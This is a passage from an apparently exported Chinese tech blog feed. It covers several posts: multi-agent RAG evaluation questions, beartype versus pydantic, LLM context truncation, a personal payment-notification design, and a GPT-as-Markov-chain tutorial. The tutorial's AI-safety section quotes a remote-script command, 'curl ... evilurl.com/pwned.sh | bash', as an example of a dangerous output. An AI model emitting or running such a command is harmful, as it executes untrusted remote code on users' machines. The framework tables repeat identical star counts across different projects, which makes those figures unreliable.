关键性能指标</h5><ul><li><strong>路由准确率</strong>：路由决策的正确性</li><li><strong>响应时间</strong>：从查询到回答的总时间</li><li><strong>工具使用效率</strong>：专业Agent使用工具的效率</li><li><strong>用户满意度</strong>：用户对回答质量的评价</li></ul><h5 id="7-2-监控机制"><a href="#7-2-监控机制" class="headerlink" title="7.2 监控机制"></a>7.2 监控机制</h5><ul><li>记录所有路由决策和执行结果</li><li>跟踪每个Agent的性能指标</li><li>分析工具使用模式和效果</li><li>收集用户反馈并整合到系统改进中</li></ul><h4 id="8-结论"><a href="#8-结论" class="headerlink" title="8. 结论"></a>8. 结论</h4><p>本设计方案通过工具标签和专业Agent的结合，为大规模工具库提供了一种高效的管理和使用方式。系统的核心优势在于：</p><ol><li><strong>专业化处理</strong>：每个Agent专注于特定领域，提高回答质量</li><li><strong>高效路由</strong>：智能路由机制确保查询被正确分配</li><li><strong>可扩展性</strong>：模块化设计便于添加新工具和Agent</li><li><strong>资源优化</strong>：每个Agent只加载必要的工具，减少资源消耗</li></ol><p>未来可以进一步探索的方向包括：</p><ul><li>实现Agent之间的协作机制</li><li>添加学习功能，根据历史数据优化路由</li><li>开发更复杂的查询分解和结果整合机制</li><li>实现跨语言和多模态查询处理能力</li></ul><p>通过这种设计，系统能够更好地处理复杂查询，提供专业、准确的回答，同时保持良好的性能和可扩展性。</p><h3 id="主要开源RAG框架工具集成能力比较"><a href="#主要开源RAG框架工具集成能力比较" class="headerlink" title="主要开源RAG框架工具集成能力比较"></a>主要开源RAG框架工具集成能力比较</h3><table><thead><tr><th>框架名称</th><th>主要关注点</th><th>工具集成能力</th><th>智能体构建支持</th><th>向量数据库支持</th><th>许可证</th><th>GitHub Stars (近似)</th></tr></thead><tbody><tr><td>LangChain</td><td>通用LLM应用构建</td><td>是 (丰富的预构建工具，自定义工具，工具调用)</td><td>是 (强大的智能体构建框架)</td><td>广泛支持</td><td>MIT</td><td>~105k</td></tr><tr><td>Dify</td><td>低代码LLM应用开发</td><td>是 (通过YAML配置，AgentQL集成，自定义工具)</td><td>是 (支持代理编排)</td><td>支持多种</td><td>Apache-2.0</td><td>~90.5k</td></tr><tr><td>LlamaIndex</td><td>私有数据LLM连接</td><td>是 (FunctionTool, QueryEngineTool, ToolSpecs)</td><td>是 (FunctionAgent, ReActAgent)</td><td>广泛支持</td><td>MIT</td><td>~40.8k</td></tr><tr><td>Haystack</td><td>模块化LLM应用构建</td><td>是 (Tool类，ComponentTool，@tool装饰器)</td><td>是 (Agent组件)</td><td>支持多种</td><td>Apache-2.0</td><td>~20.2k</td></tr><tr><td>llmware</td><td>企业级RAG管道</td><td>是 (支持函数调用)</td><td>是 (支持构建代理)</td><td>支持多种</td><td>Apache-2.0</td><td>~12.7k</td></tr></tbody></table><h3 id="多智能体系统框架及其与工具集成RAG的相关性"><a href="#多智能体系统框架及其与工具集成RAG的相关性" class="headerlink" title="多智能体系统框架及其与工具集成RAG的相关性"></a>多智能体系统框架及其与工具集成RAG的相关性</h3><table><thead><tr><th>框架名称</th><th>主要支持的架构</th><th>工具集成特性</th><th>RAG关键优势</th><th>编程语言</th><th>许可证</th><th>GitHub Stars (近似)</th></tr></thead><tbody><tr><td>LangGraph</td><td>网络型，监管者型，分层型，自定义工作流，群集型</td><td>是 (通过工具调用实现智能体间交互)</td><td>灵活的智能体协作和信息传递</td><td>Python</td><td>Apache-2.0</td><td>~105k</td></tr><tr><td>AutoGen</td><td>多种，强调代码生成和执行</td><td>是 (智能体可以调用其他智能体作为工具)</td><td>强大的代码生成和执行能力，高度可定制</td><td>Python</td><td>MIT</td><td>~90.5k</td></tr><tr><td>CrewAI</td><td>团队型，基于角色和任务</td><td>是 (智能体可以使用工具执行任务)</td><td>更高层次的抽象，易于构建协作团队</td><td>Python</td><td>MIT</td><td>~40.8k</td></tr><tr><td>ADK (Agent Development Kit)</td><td>灵活，针对Gemini和Vertex AI优化</td><td>是 (支持预构建工具，MCP工具，LangChain/LlamaIndex集成)</td><td>针对谷歌云平台优化，支持多智能体转移和规划</td><td>Python</td><td>Apache-2.0</td><td>~20.2k</td></tr><tr><td>Tulip Agent</td><td>灵活，支持CRUD操作工具库</td><td>是 (通过向量存储进行语义工具搜索和执行)</td><td>降低推理成本，支持大型工具库</td><td>Python</td><td>BSD-3-Clause</td><td>~12.7k</td></tr></tbody></table><h2 id="方案架构"><a href="#方案架构" class="headerlink" title="方案架构"></a>方案架构</h2><h2 id="验证和评估"><a href="#验证和评估" class="headerlink" title="验证和评估"></a>验证和评估</h2><p>以简单基准问题 + 标准问题作为验证：</p><ul><li><p>基准问题：</p><ul><li>查询苹果的最新股价和股息数据</li><li>分别查询苹果的 1min、5min、15min、1h、4h 股票数据</li><li>苹果目前的资产负债表和现金流量表怎么样？</li><li>总结一下最近 10 条股票新闻</li><li>从新闻角度分析特朗普币还值得买入吗？</li></ul></li><li><p>标准问题：</p><ul><li>Please extract net profit, total assets and shareholders’ equity data from Netflix’s financial report, calculate its ROA and ROE, and analyze the impact of its video content capitalization policy on these indicators.</li><li>Please construct a rolling 12-month EBITDA chart based on the quarterly financial data in Meta’s latest annual report and mark the YoY growth rate inflection point.</li><li>Please analyze the changes in Apple Inc.’s (AAPL) capital structure over the past three years and calculate the changing trend of its weighted average cost of capital (WACC).</li><li>We extract R&amp;D spending data from Tesla’s (TSLA) 10-K reports and analyze its correlation with revenue growth.</li><li>Analyze the impact of Microsoft’s (MSFT) merger and acquisition activities in the past five years on its financial statements, especially the changes in goodwill and intangible assets.</li></ul></li><li><p>复杂问题</p><ul><li>找出今天 10 支大资金流动的股票/期货。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>beartype 运行时入参校验</title>
      <link href="/posts/35873.html"/>
      <url>/posts/35873.html</url>
      
        <content type="html"><![CDATA[<p><code>beartype</code> 和 <code>pydantic</code> 都是 Python 中用于类型检查和数据验证的工具，但它们的设计理念和应用场景有所不同。我们来详细对比一下它们的区别，以便你根据需求选择合适的工具。</p><hr><h2 id="🔍-beartype-vs-pydantic"><a href="#🔍-beartype-vs-pydantic" class="headerlink" title="🔍 beartype vs pydantic"></a>🔍 <strong>beartype vs pydantic</strong></h2><table><thead><tr><th>特性</th><th><code>beartype</code></th><th><code>pydantic</code></th></tr></thead><tbody><tr><td><strong>类型检查时机</strong></td><td>运行时类型检查</td><td>运行时类型验证 + 数据模型构建</td></tr><tr><td><strong>使用场景</strong></td><td>函数、方法、类的类型检查</td><td>数据模型验证、序列化/反序列化</td></tr><tr><td><strong>自动装饰</strong></td><td><code>beartype_this_package</code> 自动装饰</td><td>不支持自动装饰，每个模型需要手动定义</td></tr><tr><td><strong>性能</strong></td><td>高效、轻量，函数级别检查</td><td>性能较高，但因为有数据模型构建和验证，开销更大</td></tr><tr><td><strong>错误提示</strong></td><td>详细的参数和返回值错误提示</td><td>报错信息详细，支持字段级别的错误提示</td></tr><tr><td><strong>复杂类型支持</strong></td><td>对复杂类型支持有限</td><td>完全支持 Union、List、Dict、嵌套模型等复杂类型</td></tr><tr><td><strong>静态代码支持</strong></td><td>兼容 Python 原生类型提示（PEP 484）</td><td>使用自定义类型提示，与 MyPy 兼容</td></tr><tr><td><strong>数据转换</strong></td><td>无数据转换功能</td><td>自动数据转换（如 <code>str</code> 转 <code>int</code>，<code>datetime</code> 等）</td></tr></tbody></table><hr><h2 id="🎯-功能对比分析"><a href="#🎯-功能对比分析" class="headerlink" title="🎯 功能对比分析"></a>🎯 <strong>功能对比分析</strong></h2><table><thead><tr><th>特性</th><th><code>beartype</code> 示例</th><th><code>pydantic</code> 示例</th></tr></thead><tbody><tr><td><strong>函数类型检查</strong></td><td>✅ 自动装饰 <code>@beartype_this_package</code></td><td>❌ 不支持函数类型装饰</td></tr><tr><td><strong>数据模型验证</strong></td><td>❌ 不支持（只能用于参数和返回值检查）</td><td>✅ 强大的数据模型验证和序列化</td></tr><tr><td><strong>数据解析与转换</strong></td><td>❌ 不支持</td><td>✅ 自动数据转换，如字符串转数字、日期</td></tr><tr><td><strong>默认值和校验</strong></td><td>❌ 仅支持 Python 默认参数</td><td>✅ 支持默认值、校验器（<code>@validator</code> 装饰器）</td></tr><tr><td><strong>数据序列化/反序列化</strong></td><td>❌ 无内置序列化和反序列化功能</td><td>✅ 支持 <code>.json()</code>、<code>.dict()</code> 等序列化</td></tr></tbody></table><hr><h2 id="💡-代码示例对比"><a href="#💡-代码示例对比" class="headerlink" title="💡 代码示例对比"></a>💡 <strong>代码示例对比</strong></h2><h3 id="1-使用-beartype-进行函数类型检查"><a href="#1-使用-beartype-进行函数类型检查" class="headerlink" title="1. 使用 beartype 进行函数类型检查"></a>1. 使用 <code>beartype</code> 进行函数类型检查</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> beartype <span class="keyword">import</span> beartype</span><br><span class="line"></span><br><span class="line"><span class="meta">@beartype</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>, <span class="number">2</span>))      <span class="comment"># 正常输出 3</span></span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>, <span class="string">&quot;2&quot;</span>))    <span class="comment"># 运行时报错，类型不匹配</span></span><br></pre></td></tr></table></figure><p><strong>优点</strong>：轻量、简单、零配置<br> <strong>缺点</strong>：仅用于类型检查，无法数据转换或序列化</p><hr><h3 id="2-使用-pydantic-进行数据模型验证和转换"><a href="#2-使用-pydantic-进行数据模型验证和转换" class="headerlink" title="2. 使用 pydantic 进行数据模型验证和转换"></a>2. 使用 <code>pydantic</code> 进行数据模型验证和转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel, ValidationError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    <span class="built_in">id</span>: <span class="built_in">int</span></span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    age: <span class="built_in">int</span> = <span class="number">18</span>  <span class="comment"># 默认值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    user = User(<span class="built_in">id</span>=<span class="string">&quot;123&quot;</span>, name=<span class="string">&quot;Alice&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(user)</span><br><span class="line"><span class="keyword">except</span> ValidationError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p><strong>输出</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=123 name=&#x27;Alice&#x27; age=18</span><br></pre></td></tr></table></figure><p><strong>优点</strong>：</p><ul><li>强大的数据转换和默认值支持</li><li>结构化数据验证</li></ul><p><strong>缺点</strong>：</p><ul><li>需要手动定义数据模型</li><li>运行时有性能开销</li></ul><hr><h2 id="🔧-适用场景建议"><a href="#🔧-适用场景建议" class="headerlink" title="🔧 适用场景建议"></a>🔧 <strong>适用场景建议</strong></h2><table><thead><tr><th>使用场景</th><th>适合工具</th><th>说明</th></tr></thead><tbody><tr><td>轻量级的函数参数和返回值类型检查</td><td><code>beartype</code></td><td>高效、简洁、轻量，适合快速类型检查</td></tr><tr><td>复杂的业务数据模型验证和序列化</td><td><code>pydantic</code></td><td>复杂数据验证、转换、序列化的最佳选择，支持 FastAPI 等框架</td></tr><tr><td>快速调试、原型开发</td><td><code>beartype</code></td><td>不需要复杂的数据模型，只需检查类型一致性</td></tr><tr><td>严格的输入校验和数据转换需求</td><td><code>pydantic</code></td><td>需要严格的类型转换、字段验证和数据解析</td></tr></tbody></table><hr><h2 id="🔥-总结"><a href="#🔥-总结" class="headerlink" title="🔥 总结"></a>🔥 <strong>总结</strong></h2><ul><li>如果你的目标是快速、轻量的 <strong>运行时类型检查</strong>，**<code>beartype</code>** 是首选。可以轻松扩展到整个项目而不需要重构代码。</li><li>如果你需要 <strong>数据模型的验证、转换、序列化</strong>，或者正在使用 FastAPI 等框架，**<code>pydantic</code>** 更加全面、强大。</li></ul><p>你目前的项目是哪种需求呢？我可以帮你更具体地调整方案！ 😊🚀</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI断片了吗？探秘大模型在超长对话中的理解能力</title>
      <link href="/posts/25614.html"/>
      <url>/posts/25614.html</url>
      
        <content type="html"><![CDATA[<h1 id="AI断片了吗？探秘大模型在超长对话中的理解能力"><a href="#AI断片了吗？探秘大模型在超长对话中的理解能力" class="headerlink" title="AI断片了吗？探秘大模型在超长对话中的理解能力"></a>AI断片了吗？探秘大模型在超长对话中的理解能力</h1><p>我们经常需要跟大模型进行反复、冗长的对话，才能令大模型给到我们一个满意的答复。像在写作、代码补全等长上下文的创作场景，需要不断的修正大模型的回答，对未完成内容进行续写，很容易就<strong>超出了目前大模型能够支持的上下文长度</strong>。</p><h2 id="断片原因"><a href="#断片原因" class="headerlink" title="断片原因"></a>断片原因</h2><p>大模型断片是可以追溯的，这里需要讲解一下大模型的前置知识。关于大模型的 token 长度，这边有一篇文章讲如何构建 GPT 模型<a href="https://daojianime.github.io/posts/60917.html%EF%BC%8C%E9%98%85%E8%AF%BB%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E5%8F%AF%E4%BB%A5%E5%AF%B9">https://daojianime.github.io/posts/60917.html，阅读这篇文章可以对</a> <code>token</code>有更深一步的理解。</p><p><code>token</code>简单来说就是我们跟大模型的对话<strong>文字在多维空间</strong>的一个表达，这里 <code>token</code>是模型训练、推理中使用的<code>tokenizer</code>将文字转换成的向量，token 数量跟文字数量并不是一一对应的，因为在多维空间的表达经常会将一个词作为一个<code>token</code>这种操作。</p><p>在我们理解何为 <code>token</code> 的基础上，我们再看看为什么 <code>token</code> 数有限。</p><p>首先在大模型的训练中，动辄是 TB 级的训练语料，需要用到的算力目前都是 H100、A100 这种昂贵的显卡，其次训练的时间也是一两周起步、甚至到数月一轮。所以在模型训练中设计的 <code>token</code> 数量就有必要做限制了，这样才能在有限的资源下，确保可以产出有效的成果。在超长上下文中，确保语料的质量也是一个难题，通常的对话内容没有那么长的上下文。</p><p>结合上述原因，我们理解了大模型的上下文限制，那么超出限制的上下文怎么样了？答案是截断。</p><p>这又引申出来了一个问题，大模型怎么做截断的？要知道超出限制的上下文模型无法处理了，无脑截断会导致我们的对话崩溃，模型胡言乱语。这里给出答案，其实是截断前面的对话内容，但并非无脑截断。具体怎么截断的，就需要讲到大模型中的 system、human、assistant 标签和截断后处理的策略了，笼统讲就是会渐渐遗忘之前的对话内容。</p><h2 id="修复-AI-断片"><a href="#修复-AI-断片" class="headerlink" title="修复 AI 断片"></a>修复 AI 断片</h2><p>虽然现在大模型的上下文长度能够达到非常长的一个能力，但是部署资源也是有限的，随着大模型出现截断，作为大模型应用工程师我们需要考虑如何降低对话崩溃的出现。</p><p>目前流行的方案基本上是对前面的 human 和 assistant 上下文做摘要提取，然后再加回上下文记忆中。但是这个处理能力，终究是有上限的，根据具体的场景可以做方案适配，完全由大模型做摘要提取并不是一个很好的做法。举例子，如 FIM 场景，超出上下文限制的代码，可以将与此次 query 无关的文件屏蔽掉，针对相关的文件可以做摘要提取，将与调用链相关的代码作为上下文给到模型做补全，这时候作为一个 ReAct Agent 就可以非常不错的完成代码补全了。</p><h2 id="关注大模型发展方向"><a href="#关注大模型发展方向" class="headerlink" title="关注大模型发展方向"></a>关注大模型发展方向</h2><p>是推理大模型还是标准大模型？</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人免签方案</title>
      <link href="/posts/33210.html"/>
      <url>/posts/33210.html</url>
      
        <content type="html"><![CDATA[<h1 id="个人免签方案"><a href="#个人免签方案" class="headerlink" title="个人免签方案"></a>个人免签方案</h1><h2 id="方案说明"><a href="#方案说明" class="headerlink" title="方案说明"></a>方案说明</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>个人免签国内主要是解决网银的<strong>微信</strong>+<strong>支付宝</strong>支付渠道的对接，这两种方案要进行免签的话，可以通过监听通知消息回写数据库达到转账记录的目的，通过+/-0.1 金额进行多笔订单同时转账场景下确保订单一致性。比较符合的就有 V 免签、码支付、彩虹交易等。其中只有 V 免签有良好的开源生态，因此选用 V 免签进行定制化。</p><h3 id="方案调研"><a href="#方案调研" class="headerlink" title="方案调研"></a>方案调研</h3><h4 id="手机监听"><a href="#手机监听" class="headerlink" title="手机监听"></a>手机监听</h4><p><a href="https://github.com/zwc456baby/vmqApk?tab=readme-ov-file">Android 15 Supported vmq apk</a></p><h4 id="PC-监听"><a href="#PC-监听" class="headerlink" title="PC 监听"></a>PC 监听</h4><p><a href="https://github.com/shinian-a/Vmq-App">未开源 PC 端</a></p><h4 id="Linux-虚拟化"><a href="#Linux-虚拟化" class="headerlink" title="Linux 虚拟化"></a>Linux 虚拟化</h4><p>itchat-uos</p><h3 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h3><ul><li>Api:<code> fastapi + python3.12</code></li><li>SQL DB: <code>Postgres</code></li><li>Cache DB: <code>Redis</code></li><li>Cron: <code>apscheduler</code></li><li>Python Lint: <code>ruff + mypy</code></li></ul><h2 id="设计问题"><a href="#设计问题" class="headerlink" title="设计问题"></a>设计问题</h2><h3 id="同时多个订单生成，如何区分不同订单支付的"><a href="#同时多个订单生成，如何区分不同订单支付的" class="headerlink" title="同时多个订单生成，如何区分不同订单支付的"></a>同时多个订单生成，如何区分不同订单支付的</h3><p>通过订单金额不同，以 0.1 步长形成一个梯度去生成订单，同时对 key (price+商户 ID) 使用一个超时异步锁，设置默认 1 分钟超时时间，以订单生成时间字段形成一个锁，每次查询 uid 下最后一个订单，时间超过 1 分钟才允许创建新订单。确保订单和付款信息一致性，在单支付渠道下增加并发量。</p><h3 id="多个租户之间如何区分订单和监控推送信息"><a href="#多个租户之间如何区分订单和监控推送信息" class="headerlink" title="多个租户之间如何区分订单和监控推送信息"></a>多个租户之间如何区分订单和监控推送信息</h3><p>待回答</p><h3 id="如何兼容多渠道多收款账号"><a href="#如何兼容多渠道多收款账号" class="headerlink" title="如何兼容多渠道多收款账号"></a>如何兼容多渠道多收款账号</h3><p>待回答</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastapi </tag>
            
            <tag> Python </tag>
            
            <tag> 支付接口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPT学习分享</title>
      <link href="/posts/60917.html"/>
      <url>/posts/60917.html</url>
      
        <content type="html"><![CDATA[<h1 id="GPT学习分享"><a href="#GPT学习分享" class="headerlink" title="GPT学习分享"></a>GPT学习分享</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>学习Microsoft Build 2023的分享<a href="https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2">State of GPT</a>。围绕三个内容讲解：</p><ol><li>GPT模型</li><li>如何训练一个GPT助手</li><li>如何有效的将这些助手应用到业务上</li></ol><h2 id="有限状态马尔可夫链（FSMC）"><a href="#有限状态马尔可夫链（FSMC）" class="headerlink" title="有限状态马尔可夫链（FSMC）"></a>有限状态马尔可夫链（FSMC）</h2><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/states-2.png" alt="img"></p><p>本文展示了一个极简 GPT，它只有 2 个 token <code>0</code> 和 <code>1</code>，上下文长度为 <code>3</code>； 这样的 GPT 可以看做是一个有限状态马尔可夫链（FSMC）。 我们将用 token sequence <code>111101111011110</code> 作为输入对这个极简 GPT 训练 50 次， 得到的状态转移概率符合我们的预期。</p><h2 id="二进制GPT"><a href="#二进制GPT" class="headerlink" title="二进制GPT"></a>二进制GPT</h2><h3 id="token只有0和1"><a href="#token只有0和1" class="headerlink" title="token只有0和1"></a>token只有0和1</h3><ul><li>输入：<code>0010101</code></li><li>输出：下一个token是0的概率(P0)和1的概率(P1)</li></ul><p>例如输入的是：<code>010</code>，根据自身的参数和状态可能下一个token是1的概率为80%，即</p><ul><li>P(0) = 20%</li><li>P(1) = 80%</li></ul><h3 id="状态-上下文-和上下文长度"><a href="#状态-上下文-和上下文长度" class="headerlink" title="状态(上下文)和上下文长度"></a>状态(上下文)和上下文长度</h3><p>上下文：相邻的三个token，用来预测下一个token，这三个token就是一个上下文，即GPT的<strong>状态</strong>。</p><p>上下文长度：用来预测下一个token的token长度，如上文的<strong>3</strong>。</p><h3 id="状态空间"><a href="#状态空间" class="headerlink" title="状态空间"></a>状态空间</h3><p>状态空间即所有可能出现的状态集合。</p><ul><li>**<code>vocab_size</code>**：token有多少可能的值。例如上文的0和1。</li><li>**<code>context_length</code>**：上下文长度，例如上文的3。</li></ul><p>$$<br>total_states = vocab_sizee^{context_length}<br>$$</p><p>则上午的二进制GPT总的状态数量就是 $2^{3} = 8$​。这也很好理解，所有状态枚举就能出来： {<code>000</code>, <code>001</code>, <code>010</code>, <code>011</code>, <code>100</code>, <code>101</code>, <code>110</code>, <code>111</code>}。</p><h3 id="真实的状态空间"><a href="#真实的状态空间" class="headerlink" title="真实的状态空间"></a>真实的状态空间</h3><p>真实的GPT中输入也可是1个token和2个token，这里简化的二进制GPT像上面的有限状态马尔可夫链，容易理解。</p><p>所以真实的状态空间为<br>$$<br>\sum_{i=1}^{content_length}{vocab_size}^{i}<br>$$<br>所有真实的状态一共有$2^{1}+2^{2}+2^{3}=14$种。为了方便理解，文中使用简化版的状态空间。</p><h3 id="状态转移"><a href="#状态转移" class="headerlink" title="状态转移"></a>状态转移</h3><p>如序列<code>0101</code>，从状态<code>010</code>到状态<code>101</code>就是一次状态转移。</p><h2 id="问题讨论"><a href="#问题讨论" class="headerlink" title="问题讨论"></a>问题讨论</h2><h3 id="词典大小和上下文长度"><a href="#词典大小和上下文长度" class="headerlink" title="词典大小和上下文长度"></a>词典大小和上下文长度</h3><p>本文讨论的是基于 3 个 token 的二进制 GPT。实际应用场景中，</p><ul><li><code>vocab_size</code> 会远远大于 2，例如 <strong><code>50k</code><strong>（</strong><code>GPT-2</code></strong> 的配置）；</li><li><code>context_length</code> 的典型范围 **<code>2k~32k</code>**（GPT 2/3/4 的上下文长度分别为 **<code>2k/4k/32k</code>**）。</li></ul><h3 id="模型参数大小（GPT-2-3-4）"><a href="#模型参数大小（GPT-2-3-4）" class="headerlink" title="模型参数大小（GPT 2/3/4）"></a>模型参数大小（GPT 2/3/4）</h3><p>本文的例子是用 3bit 来存储一个状态，因此所需存储空间极小；但真实世界中的 GPT 模型所需的存储空间就大了。</p><p><a href="https://www.lesswrong.com/posts/7qSHKYRnqyrumEfbt">这篇文章</a> 对比了 GPT 和常规计算机（computers）的 size，例如：</p><ul><li><p>GPT-2 有 <strong><code>50257</code></strong> 个独立 token，上下文长度是 <strong><code>2048</code></strong> 个 token。</p><p>每个 token 需要 <code>log2(50257) ≈ 15.6bit</code> 来表示，那一个上下文或 <strong>一个状态</strong>需要的存储空间就是 **<code>15.6 bit/token * 2048 token = 31Kb ≈ 4KB</code>**。 </p></li><li><p>GPT-3 的上下文长度为 **<code>4096 tokens</code>**，因此需要 <strong><code>8KB</code></strong> 内存。</p></li><li><p>GPT-4 的上下文长度高达 <strong><code>32K tokens</code></strong> ，因此大约 <strong><code>64KB</code></strong> 才能存储一个状态。</p></li></ul><h3 id="AI-安全"><a href="#AI-安全" class="headerlink" title="AI 安全"></a>AI 安全</h3><p>如果把 GPT 看做有限状态马尔可夫链，那 GPT 的安全需要考虑什么？ 答案是**将所有转移到不良状态的概率降低到 0， 例如以 token 序列 <code>[66, 6371, 532, 82, 3740, 1378, 23542, 6371, 13, 785, 14, 79, 675, 276, 13, 1477, 930, 27334]</code> 结尾的状态 —— 这个 token sequence 其实就是 **<code>curl -s https://evilurl.com/pwned.sh | bash</code>这一 shell 命令的编码，如果真实环境中用户执行了此类恶意命令将是非常危险的。</p><p>更一般地来说，可以设想状态空间的某些部分是“红色”的，</p><ul><li>首先，我们永远不想转移到这些不良状态；</li><li>其次，这些不良状态很多，无法一次性列举出来；</li></ul><p>因此，<strong>GPT 模型本身</strong>必须能够基于训练数据和 Transformer 的归纳偏差， <strong>自己就能知道这些状态是不良的</strong>，转移概率应该设置为 0%。 如果概率没有收敛到足够小（例如 <code>&lt; 1e-100</code>），那在足够大型的部署中 （例如<code>Temperature &gt; 0</code>，也没有用 <code>topp/topk</code> （采样超参数） 强制将低概率置为零） 可能就会命中这个概率，造成安全事故。</p><h3 id="跟着代码学习构建一个babyGPT"><a href="#跟着代码学习构建一个babyGPT" class="headerlink" title="跟着代码学习构建一个babyGPT"></a>跟着代码学习构建一个babyGPT</h3><p>colab文章[^3]</p><h2 id="原始的Transformer"><a href="#原始的Transformer" class="headerlink" title="原始的Transformer"></a>原始的Transformer</h2><p>当时的seq-to-seq（即文本序列转数字序列）模型的标准结构是Teacher forcing的<code>encoder-decoder</code>架构。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/encoder-decoder.png" alt="encoder - decoder"></p><p><font>Encoder</font>获取整个<code>Input</code>序列转换成一个<strong>潜在表示序列</strong>，可以是一个数字序列，即运算中的向量。然后传递给<code>Decoder</code>，后者解码成目标序列。</p><p>Transformer是一系列拥有<code>注意力机制(self-attention)</code>的架构，即能够和上下文有联系。Teacher forcing是指运许<code>decoder</code>访问<code>Input</code>的技术，也就是结合<code>Input</code>和<code>潜在表示序列</code>进行采样来生成目标序列，这样能够减少潜在表示序列的压力。理想情况下输入同样的<code>Input</code>能够生成两个语义相同的不同句子。</p><h2 id="Transformer的进化"><a href="#Transformer的进化" class="headerlink" title="Transformer的进化"></a>Transformer的进化</h2><p>Transformer进化的路上主要有2种语言模型：</p><ul><li>自编码（auto-encoder）语言模型</li><li>自回归（auto-regressive）语言模型</li></ul><h3 id="auto-encoder的优缺点"><a href="#auto-encoder的优缺点" class="headerlink" title="auto-encoder的优缺点"></a>auto-encoder的优缺点</h3><ul><li>优点：自然地融入双向语言模型，同时看到被预测单词的上文和下文</li><li>缺点：训练和预测不一致。训练的时候输入引入了[Mask]标记，但是在预测阶段往往没有这个[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致。</li></ul><h3 id="auto-regressive的优缺点"><a href="#auto-regressive的优缺点" class="headerlink" title="auto-regressive的优缺点"></a>auto-regressive的优缺点</h3><ul><li>优点：对于生成类的NLP任务，比如文本摘要，机器翻译等，从左向右的生成内容，天然和自回归语言模型契合。</li><li>缺点：由于一般是从左到右（当然也可能从右到左），所以只能利用上文或者下文的信息，不能同时利用上文和下文的信息。</li></ul><h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>原始的Transformer模型很适合<font>机器翻译</font>，因为机器翻译正是一个文本序列转换成另一个文本序列（seq-to-seq）的过程。</p><p>在解决一些实际任务的时候，并不需要完整的<code>encoder</code>和<code>decoder</code>结构，经过使用单一结构和堆的尽可能高的层数，然后使用大量语料训练，出现了两个突出的模型，即<code>BERT</code>和<code>GPT-2</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-transformer.webp" alt="transformer"></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-bert.webp" alt="gpt-bert"></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-gpt-his2.webp" alt="gpt区分"></p><p>BERT和GPT训练都使用了<strong>Masked Self-Attention</strong>的方式。BERT在训练中通过对随机单词进行Mask，然后推测Mask的单词；GPT则是通过屏蔽下文的单词进行训练，通过输入的序列预测下一个可能出现的单词。在训练数据上两者也有区别，BERT在大量的英文数据和维基百科中进行训练，语料多但是没有经过筛选，GPT则是寻找在Reddit社交媒体、维基百科和英文书籍上的优质文章进行训练。</p><p>参数量：</p><ul><li>BERT：340M</li><li>GPT-2：1.5B</li></ul><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/4-mask.png" alt="mask attention"></p><h2 id="训练AI助手引言"><a href="#训练AI助手引言" class="headerlink" title="训练AI助手引言"></a>训练AI助手引言</h2><p>训练大模型助手主要分成四个阶段：</p><ol><li><strong>预训练</strong>（pre-training）</li><li><strong>监督微调</strong>（supervised fine tuning, SFT）</li><li><strong>奖励建模</strong>（reward modeling）</li><li><strong>强化学习</strong>（reinforcement learning）</li></ol><p>每个阶段又分成三个部分，<strong>数据集</strong>、<strong>算法训练</strong>、<strong>模型输出</strong>。</p><p><img 